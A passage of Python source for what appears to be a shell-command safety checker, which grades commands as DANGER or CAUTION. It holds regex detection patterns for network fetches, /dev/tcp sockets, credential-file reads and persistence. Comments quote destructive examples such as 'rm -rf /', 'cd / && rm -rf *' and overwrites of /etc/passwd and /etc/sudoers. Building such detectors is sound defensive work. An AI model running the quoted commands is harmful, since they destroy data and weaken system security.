    (re.compile(r"\b(curl|wget)\b[^|;]*\b(https?://|[a-z0-9-]+\.[a-z]{2,})"),
     "contacts the network"),
    (re.compile(r"\bdocker\s+system\s+prune\b[^|;]*-a|\bdocker\s+system\s+prune\s+-a"),
     "removes all unused docker images, not just dangling ones"),
    (re.compile(r"\bsudo\b"), "requires sudo"),
    (re.compile(r"\bsetfacl\b[^|;]*-\w*R\w*[^|;]*(?<!\S)"
                r"(/|/etc|/usr|/var|/home|/boot|/bin|/sbin|/root)(?!\S)"),
     "recursively rewrites ACLs on a critical path"),

    # --- SEMANTIC CLASSES, at CAUTION -----------------------------------
    # Everything here is legitimate often enough that DANGER would be noise,
    # but is worth naming because the user cannot see the consequence in the
    # command itself.

    # Reading a credential to the terminal is not exfiltration -- it is how you
    # check a key, and `sudo cat /etc/shadow` is how you check a lock state.
    # But it puts the secret into scrollback, the terminal's history, and any
    # session recording, so it deserves a word. The write verbs are excluded:
    # `ssh-keygen -f ~/.ssh/id_rsa` and `chmod 600 ~/.ssh/id_rsa` are the
    # correct handling of a key and must stay silent.
    (re.compile(rf"\b(?:cat|less|more|head|tail|strings|xxd|od|base64)\b"
                rf"[^|;]{{0,200}}(?:{SECRET_FILE})"),
     "prints a private key or credential file to the terminal"),
    # A raw socket opened by the shell with no shell attached to it: usually a
    # port check (`cat < /dev/tcp/host/22`), occasionally the first half of
    # something else. The reverse-shell shapes are DANGER above.
    (re.compile(r"/dev/(?:tcp|udp)/"),
     "opens a raw network socket through bash's /dev/tcp"),
    # `crontab -` REPLACES the crontab rather than adding to it, which is why
    # the persistence idiom is always `(crontab -l; echo ...) | crontab -`:
    # without the `crontab -l` the existing jobs are silently gone.
    (re.compile(r"\|\s{0,4}(?:sudo\s+)?crontab\s+-\s{0,4}(?:$|[|;&])"),
     "`crontab -` replaces the ENTIRE crontab with what it reads"),
    # Appending to a startup file or dropping a unit/cron file in place is the
    # normal way to install something, and also the normal way to install
    # something unwanted. The distinguishing fact the user needs is only that
    # it will run again by itself.
    (re.compile(rf">>\s{{0,4}}\S{{0,64}}{SHELL_RC}(?![\w.])"
                rf"|\btee\b[^|;]{{0,120}}{SHELL_RC}(?![\w.])"
                rf"|(?:>\|?>?|\btee\b[^|;]{{0,120}})\s{{0,4}}"
                rf"/etc/(?:cron\.[a-z]{{1,8}}/|crontab|rc\.local|systemd/system/|init\.d/)"),
     "installs code that will run automatically on every login or boot"),
    # World-writable means every account on the machine can rewrite the file,
    # including a compromised service account -- and for a directory it means
    # anyone can replace its contents. The mode alternative matches only modes
    # whose OTHER digit carries the write bit (2/3/6/7), so `755`, `644` and
    # `775` stay silent; `chmod -R 777 .` is the shape this exists for.
    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:[0-7]{0,1}[0-7]{2}[2367](?=\s|$)|[ugoa]*o\+w)"),
     "makes files writable by every user on the machine"),
    # setgid on a directory makes new files inherit its group, which is the
    # standard shared-project setup -- named, not warned about.
    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:0?[2][0-7]{3}(?=\s|$)|[ugoa]*g\+s)"),
     "sets the setgid bit"),
    # Remounting the root filesystem read-only does not destroy anything and is
    # undone by a remount, but every running service that writes will start
    # failing immediately.
    (re.compile(r"\bmount\b[^|;]{0,80}\bremount\b[^|;]{0,40}(?<!\S)/(?!\S)"),
     "remounts the root filesystem -- running services may start failing"),
]

PLACEHOLDER_RE = re.compile(r"<[^<>\s][^<>]*>")
PLACEHOLDER_HINT = re.compile(
    r"(/path/to/|/path/of/|\byour[-_]|\bmy[-_]|\bfilename\b|\bscript_name\b|"
    r"\bcontainer[-_]id\b|example\.com|username/repo)")


def split_segments(command: str) -> list[str]:
    """Split on shell operators so each clause is judged on its own.

    A correct first clause followed by a destructive one is a real observed
    failure mode, so every segment is checked independently. Patterns that must
    SEE an operator belong in WHOLE_DANGER instead.

    A lone `|` is a pipe, but `>|` is bash's force-clobber redirect operator --
    a single token, not "redirect then pipe". Splitting on that `|` tore
    `: >|/etc/passwd` into `: >` and `/etc/passwd`, and neither half contains
    both the redirect and the target, so the write got past every check that
    looks for `>` followed by a critical path. The negative lookbehind keeps
    `>|` intact while still splitting ordinary pipes and `||`.
    """
    segments: list[str] = []
    current: list[str] = []
    quote: str | None = None
    escaped = False
    i = 0

    while i < len(command):
        ch = command[i]

        if escaped:
            current.append(ch)
            escaped = False
            i += 1
            continue
        if ch == "\\" and quote != "'":
            current.append(ch)
            escaped = True
            i += 1
            continue
        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            current.append(ch)
            i += 1
            continue

        # `>|` is one force-clobber redirect token, not a redirect followed by
        # a pipeline. Keep its pipe with the current segment.
        if ch == "|" and current and current[-1] == ">":
            current.append(ch)
            i += 1
            continue
        if ch in "|;&\n":
            segment = "".join(current).strip()
            if segment:
                segments.append(segment)
            current = []
            # `&&` and `||` are one boundary. A single `&`/`|` is a boundary too.
            if i + 1 < len(command) and command[i + 1] == ch and ch in "&|":
                i += 1
            i += 1
            continue

        current.append(ch)
        i += 1

    segment = "".join(current).strip()
    if segment:
        segments.append(segment)
    return segments


def check(command: str) -> list[tuple[str, str]]:
    """Return [(severity, reason)]. Empty means nothing flagged.

    severity is "DANGER" (never auto-run) or "CAUTION" (warn only).
    """
    if not command or not command.strip():
        return []
    clean = _strip_control(command)
    # Placeholders are documentation, not shell syntax: the `>` inside
    # `docker exec -it <container-id> sh` was once read as a redirect into /bin.
    scan = PLACEHOLDER_RE.sub("PLACEHOLDER", clean)

    findings: list[tuple[str, str]] = []
    for pat, why in WHOLE_DANGER:
        if pat.search(scan):
            findings.append(("DANGER", why))
    for pat, why in WHOLE_CAUTION:
        if pat.search(scan):
            findings.append(("CAUTION", why))

    # `cd / && rm -rf *` is identical in effect to `rm -rf /`, but judging each
    # segment in isolation sees only a harmless-looking `rm -rf *`. Track a cd
    # into a critical directory so later segments are read in that light.
    cwd_is_critical = False
    cwd_ascended = False
    # A THIRD audit found that a bare `rm -rf *` (or `find . -exec rm`) with NO
    # preceding `cd` at all was invisible: the glob-in-critical-dir rule only
    # fires once a `cd` has established a *known* directory. "start fresh in
    # this directory" / "wipe this folder clean" produce exactly this, and it
    # deletes everything in whatever directory the user happens to be in when
    # they run it -- unknown, unscoped, and potentially $HOME. Once a `cd`
    # (anywhere, even to somewhere harmless) has explicitly named a
    # subdirectory, that ambiguity is gone, which is why `cd ./build &&
    # rm -rf *` is deliberately still clean below -- the user picked the
    # directory on purpose.
    cd_seen = False

    for seg in split_segments(scan):
        toks = _tokenize(seg)
        if not toks:
            continue

        # Strip no-op wrappers and env assignments, then basename the binary.
        # Without this, `/bin/rm -rf /`, `sudo rm -rf /`, `env x=1 rm -rf /`,
        # `nohup rm -rf /` and `nice rm -rf /` all passed clean while running rm.
        while toks:
            head = toks[0]
            if ("=" in head and not head.startswith(("-", "/"))
                    and head.split("=", 1)[0].isidentifier()):
                toks = toks[1:]          # VAR=value prefix
                continue
            base = head.rsplit("/", 1)[-1]
            if base in WRAPPERS:
                toks = toks[1:]
                # A second audit found stripping only the wrapper's NAME left
                # its own option as the new head token -- `sudo -u root rm -rf /`,
                # `env -i rm -rf /`, `nice -n 19 rm -rf /` all left `-u`/`-i`/`-n`
                # unrecognized as a verb, so `rm` itself was never inspected.
                # Consume the wrapper's own options too, including one that
                # takes a SEPARATE value token (`-n 19`, but not `-n19`).
                value_opts = WRAPPER_VALUE_OPTS.get(base, set())
                while toks and toks[0] != "--" and toks[0].startswith("-"):
                    opt = toks[0]
                    toks = toks[1:]
                    if opt in value_opts and toks and not toks[0].startswith("-"):
                        toks = toks[1:]
                if toks and toks[0] == "--":
                    toks = toks[1:]
                continue
            break
        if not toks:
            continue

        # A command name produced by substitution (`$(echo rm) -rf /`) can
        # never be resolved statically -- shlex does not group `$( ... )` as
        # one token at all, so the "verb" here is literally the substring
        # `$(echo`. This cannot be fixed generically (that is the eval/base64
        # class the module's docstring already disclaims), but it can at
        # least be surfaced rather than silently judged as an unknown, inert verb.
        if re.search(r"\$\(|`", toks[0]):
            findings.append(("CAUTION",
                              "command name comes from a substitution"
                              " -- cannot verify what will run"))
            continue

        verb = toks[0].rsplit("/", 1)[-1]

        # `bash -c "<command>"` hides the whole command inside a string argument.
        # Shells accept option bundles, so `bash -lc` and `sh -xc` carry the same
        # command-string semantics as a standalone `-c`.
        if verb in SHELL_RUNNERS:
            for i, t in enumerate(toks[1:], start=1):
                if t == "--" or not t.startswith("-"):
                    break
                if not t.startswith("--") and "c" in t[1:] and i + 1 < len(toks):
                    findings.extend(check(toks[i + 1]))
                    break

        # `eval STRING` is bash's other "run this text as a command" form.
        # Only the single-string case is handled -- `eval $(cmd)` builds the
        # string dynamically and is the same unresolvable-substitution problem
        # as above, not something a static check can chase.
        if verb == "eval" and toks[1:]:
            findings.extend(check(" ".join(toks[1:])))
            continue

        args = toks[1:]
        flags = _flags(toks)

        # rsync --delete whose DESTINATION is critical is a different matter.
        if verb == "rsync" and any(a == "--delete" or a.startswith("--delete") for a in args):
            positional = [a for a in args if not a.startswith("-")]
            if positional:
                crit, why = _is_critical(positional[-1])
                if crit:
                    findings.append(("DANGER", f"rsync --delete into a critical path: {why}"))

        if verb == "cd":
            target = next((a for a in args if not a.startswith("-")), None)
            if target is not None:
                crit, _ = _is_critical(target)
                cwd_is_critical = crit
                # An ascent leaves the CWD above where the user started, which
                # is unresolvable here. Sticky: `cd .. && cd subdir` is still
                # somewhere above the origin.
                if ".." in target.split("/"):
                    cwd_ascended = True
                elif target.startswith("/"):
                    cwd_ascended = False   # absolute cd re-anchors the path
            cd_seen = True
            continue

        if verb in DESTRUCTIVE_VERBS:
            hit = False
            for a in args:
                crit, why = _is_critical(a)
                if crit:
                    findings.append(("DANGER", f"{verb}: {why}"))
                    hit = True
                    break
            if not hit and cwd_is_critical and any(
                    ch in a for a in args if not a.startswith("-") for ch in "*?["):
                findings.append(
                    ("DANGER", f"{verb}: glob in a critical directory entered by an earlier cd"))
                hit = True
            if not hit and cwd_ascended and any(
                    ch in a for a in args if not a.startswith("-") for ch in "*?["):
                # `cd .. && cd .. && rm -rf *` reached neither guard: `..` is
                # not a critical path so cwd_is_critical stayed False, and
                # cd_seen being True disabled the unscoped-CWD rule below. The
                # directory two levels above an unknown CWD is exactly as
                # unknowable as the CWD itself.
                findings.append(("DANGER",
                    f"{verb}: glob delete in a directory reached by 'cd ..' -- the target is "
                    f"a parent of where you started, which this cannot resolve"))
                hit = True
            if not hit and not cd_seen and ("r" in flags or "R" in flags):
                # No `cd` at all means the real CWD is whatever directory the
                # user happened to be in -- unknown to this checker, and
                # possibly $HOME or a project root. `*`/`.`/`./*` as the ONLY
                # target, with no subdirectory named and no filename filter,
                # is the same "delete everything, wherever this runs" shape as
                # `rm -rf /`, just without a literal critical path to match.
                positional = [a for a in args if not a.startswith("-")]
                if positional and all(p in ("*", ".", "./", "./*") for p in positional):
                    findings.append(("DANGER",
                        f"{verb}: recursive delete of the current directory (unknown -- no "
                        f"preceding cd) with no subdirectory or name filter to limit it"))
            if not hit:
                # Placeholder targets (`/path/to/file`) are not literally
                # critical paths, so the destructive-verb check above finds
                # nothing -- but whatever real path the user substitutes gets
                # deleted with zero further warning beyond "you forgot to fill
                # in the template". Surface both: the placeholder CAUTION
                # (added later) never suppresses this.
                for a in args:
                    if not a.startswith("-") and (
                            PLACEHOLDER_RE.fullmatch(a) or PLACEHOLDER_HINT.search(a)):
                        findings.append(("DANGER",
                            f"{verb}: target is a placeholder -- whatever real path you substitute "
                            f"will be permanently deleted"))
                        break
        elif verb == "find":
            # `-ok` is `-exec` with a per-file y/n prompt -- still deletes
            # everything the user says yes to, and `find / -ok rm -rf {} \;`
            # passed clean because only `-exec` was in the pattern.
            deletes = bool(re.search(
                r"-delete\b|-(?:exec|ok)\w*\s+(sudo\s+)?(rm|shred|truncate)\b", seg))
            # `-exec chmod/chown/chgrp` over a critical root is not a delete,
            # so the delete branch never inspected it. Re-permissioning every
            # file under / is not undone by re-running anything, so it ranks
            # with the deletes rather than with the CAUTIONs.
            repermissions = bool(re.search(
                r"-(?:exec|ok)\w*\s+(sudo\s+)?(chmod|chown|chgrp)\b", seg))
            if deletes or repermissions:
                verb_label = "find + delete" if deletes else "find + chmod/chown"
                roots = []
                for a in args:
                    if a.startswith("-"):
                        break          # predicates start; the search root is done
                    roots.append(a)
                hit = False
                # A narrowing predicate is the difference between "erase all
                # system logs" and the ordinary `find /var/log -mtime +7
                # -delete` log rotation. Both root at a critical path, so
                # without this the routine one is DANGER and never auto-runs --
                # exactly the noise this module exists to avoid. `/` itself is
                # never downgraded: no filter makes `find / -delete` routine.
                narrowed = bool(re.search(
                    r"-i?(?:name|path|regex)\b|-(?:mtime|mmin|atime|amin|ctime|cmin|size|newer)\b",
                    seg))
                for a in roots:
                    crit, why = _is_critical(a)
                    if crit:
                        sev = ("CAUTION" if narrowed and _norm_path(a) != "/" else "DANGER")
                        findings.append((sev, f"{verb_label}: {why}"))
                        hit = True
                        break
                if not hit and not cd_seen and deletes:
                    # Same "unrestricted, unscoped delete" shape as bare
                    # `rm -rf *`: search root is the CWD itself (implicit or
                    # explicit `.`) and there is no -name/-path/-regex filter
                    # narrowing which files that hits.
                    has_filter = bool(re.search(r"-i?(?:name|path|regex)\b", seg))
                    root_is_cwd = not roots or all(r in (".", "./") for r in roots)
                    if root_is_cwd and not has_filter:
                        findings.append(("DANGER",
                            "find + delete: recursive delete under the current directory "
                            "with no name/path filter to limit it"))
        elif verb in MOVE_VERBS:
            # Moving a system tree away is as destructive as deleting it.
            if verb == "mv" and args:
                crit, why = _is_critical(args[0])
                if crit:
                    findings.append(("DANGER", f"mv: {why}"))
        elif verb in PERM_VERBS:
            # The first positional argument to chmod/chown/chgrp is the MODE or
            # OWNER spec (`755`, `$USER:$USER`), never a path -- checking it too
            # meant `chown -R $USER:$USER ./project`, one of the commonest ops
            # one-liners there is, was flagged DANGER because $USER looked like
            # an unresolvable path target. So the scan starts at [1:].
            #
            # Recursion is what makes this catastrophic, but it is not what
            # makes it wrong: `chmod 777 /etc` has no -R and still opens every
            # file directly in /etc to the world, while only the exact string
            # `chmod 000 /` was caught before. The target is now checked with or
            # without -R, and -R is reported when present.
            positional = [a for a in args if not a.startswith("-")]
            recursive = "r" in flags or "R" in flags
            for a in positional[1:]:
                crit, why = _is_critical(a)
                # Without -R, chmod touches exactly one path, so an unresolved
                # variable is not the `rm -rf $EMPTY/` hazard that rule exists
                # for: an empty expansion just makes chmod error out. Keeping it
                # flagged made `chmod 600 $FILE`, an everyday scripting idiom,
                # read as DANGER. With -R the variable can still expand to a
                # tree root, so it stays.
                if crit and not recursive and "unexpanded variable" in why:
                    continue
                if crit:
                    findings.append(("DANGER", f"{verb}{' -R' if recursive else ''}: {why}"))
                    break
        elif verb == "ln":
            # `ln -f` overwrites (does not merge with) an existing destination.
            if ("f" in flags) and args:
                crit, why = _is_critical(args[-1])
                if crit:
                    findings.append(("DANGER", f"ln -f: {why} (replaced by the new link)"))
        elif verb == "install":
            # install(1) creates/truncates its destination unconditionally.
            if args:
                crit, why = _is_critical(args[-1])
                if crit:
                    findings.append(("DANGER", f"install: {why}"))
        elif verb in ("wipefs", "blkdiscard", "sgdisk") and args:
            if any(re.search(r"/dev/(sd|nvme|hd|vd|mmcblk)", a) for a in args):
                findings.append(("DANGER", f"{verb}: wipes a block device"))
        elif verb == "tee":
            # CRITICAL_FILES was only ever consulted for delete/truncate verbs
            # and the whole-command `>`/truncate regexes -- never for a WRITE
            # reaching the same file through a pipe, e.g.
            # `echo "..." | sudo tee -a /etc/sudoers`. tee always writes its
            # named file (append or not), so any critical-file argument is a
            # hit regardless of -a.
            for a in args:
                crit, why = _is_critical(a)
                if crit:
                    findings.append(("DANGER", f"tee: {why} (written to by tee)"))
                    break
        elif verb == "dd":
            # The existing dd rule only covers `of=/dev/...` (block devices).
            # `dd of=/etc/passwd` overwrites a critical FILE the same way and
            # was invisible to it.
            for a in args:
                if a.startswith("of="):
                    crit, why = _is_critical(a[3:])
                    if crit:
                        findings.append(("DANGER", f"dd: {why} (overwritten by dd)"))
                    break

        # `>|` is the force-clobber redirect; match it alongside the plain form.
        if re.search(r"(^|\s)(>|>>)\|?\s*/(etc|usr|var|boot|lib|sbin|bin)/", seg):
            findings.append(("CAUTION", "writes to a system directory"))

    if PLACEHOLDER_RE.search(clean) or PLACEHOLDER_HINT.search(clean):
        findings.append(("CAUTION", "contains a placeholder -- replace it before running"))

    seen, out = set(), []
    for f in findings:
        if f not in seen:
            seen.add(f)
            out.append(f)
    return out


def worst(findings) -> str | None:
    if any(s == "DANGER" for s, _ in findings):
        return "DANGER"
    if findings:
        return "CAUTION"
    return None
